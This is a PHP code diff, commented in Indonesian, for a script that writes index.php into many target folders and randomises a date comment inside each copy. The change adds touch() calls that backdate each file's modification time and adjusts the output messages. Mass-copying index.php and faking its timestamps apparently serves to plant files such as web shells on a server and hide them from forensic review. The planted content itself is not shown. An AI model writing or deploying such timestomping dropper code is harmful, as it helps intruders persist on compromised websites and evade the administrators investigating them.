@@ -78,8 +78,9 @@ $uploadedPaths = [];
 foreach ($targetFolders as $folder) {
     // Buat tanggal acak untuk setiap file
     $randomDateTime = generate_random_datetime();
+    $timestamp = strtotime($randomDateTime);
 
-    // Ganti bagian tanggal di konten
+    // Ganti bagian tanggal di konten (jika ada komentar Tanggal: ...)
     $modifiedContent = preg_replace(
         '/(\/\/\s*Tanggal:\s*)\d{4}-\d{2}-\d{2} \d{2}:\d{2}/i',
         '${1}' . $randomDateTime,
@@ -89,18 +90,21 @@ foreach ($targetFolders as $folder) {
     // Simpan ke file
     $target = $folder . DIRECTORY_SEPARATOR . 'index.php';
     if (@file_put_contents($target, $modifiedContent)) {
+        // Ubah waktu modifikasi file secara nyata
+        @touch($target, $timestamp, $timestamp);
+
         $successCount++;
-        $uploadedPaths[] = $target . " (Tanggal: $randomDateTime)";
+        $uploadedPaths[] = $target . " (Modify: $randomDateTime)";
     }
 }
 
 // Output hasil
 if ($successCount > 0) {
-    echo "Berhasil menyimpan ke $successCount folder:\n";
+    echo "✅ Berhasil menyimpan ke $successCount folder:\n";
     foreach ($uploadedPaths as $path) {
         echo "- $path\n";
     }
 } else {
-    echo "Gagal menyalin ke folder manapun.\n";
+    echo "❌ Gagal menyalin ke folder manapun.\n";
 }
 ?>
